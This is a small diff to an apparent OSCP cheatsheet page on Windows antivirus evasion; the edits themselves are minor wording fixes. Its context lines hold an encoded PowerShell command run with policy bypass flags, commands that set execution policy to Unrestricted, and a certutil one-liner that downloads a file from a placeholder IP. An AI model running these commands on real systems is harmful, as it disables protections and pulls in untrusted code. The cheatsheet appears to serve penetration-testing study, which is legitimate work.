@@ -1,6 +1,6 @@
 ---
 title: Windows Antivirus
-author: sKyW1per 
+author: sKyW1per
 category: "OSCP"
 date: "2021-03-11 00:01"
 tags: [OSCP, Cheatsheet]
@@ -37,6 +37,7 @@ $ powershell.exe -nop -exec bypass -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAA
 
 ###### Basic AV Evasion ~ Powershell Execution Policy Bypass
 ```
+View Execution Policy
 $ Get-ExecutionPolicy -Scope CurrentUser
 $ Get-ExecutionPolicy
 
@@ -44,6 +45,6 @@ Disable Execution Policy Protection for PowerShell
 $ Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
 $ Set-ExecutionPolicy Unrestricted
 
-Or avoid the protection for 1 command:
+Or avoid this protection for 1 command:
 $ powershell.exe -exec bypass -Command "& {certutil.exe -urlcache -f http://192.168.1.1:80/file.txt}"
 ```
